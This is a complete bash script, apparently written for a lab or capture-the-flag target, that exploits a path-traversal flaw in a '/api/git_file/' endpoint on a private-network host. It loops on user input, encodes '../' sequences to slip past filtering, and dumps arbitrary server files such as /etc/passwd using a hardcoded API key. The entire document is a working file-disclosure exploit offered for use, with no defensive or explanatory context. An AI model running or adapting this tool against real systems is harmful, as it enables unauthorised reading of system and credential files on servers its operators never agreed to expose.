#!/bin/bash

echo -e "\033[0;32m###############################"
echo -e "#   built by hackercon        #"
echo -e "###############################\033[0m"

while true; do
  echo -e "Enter File To Read - eg. /etc/passwd"
  echo -e -n "\033[0;36m(FILE)> \033[0m"
  read file_path
  echo

  if [ "$file_path" == "exit" ]; then
    echo -e "\033[0;32mExiting...\033[0m"
    break
  fi

  encoded_path=$(echo "$file_path" | sed 's/\//%2F/g' | sed 's/\.\./%2e%2e/g')

  url="http://10.0.14.37:6789/api/git_file/$encoded_path?api_key=wokrs"

  response=$(lynx -dump "$url")

  if [[ "$response" == *"content"* ]]; then
    echo -e "\033[0;32mFile Content:\033[0m"
    echo -e "\033[0;32m$response\033[0m"
  else
    echo -e "\033[0;31mError or no content returned.\033[0m"
  fi
done
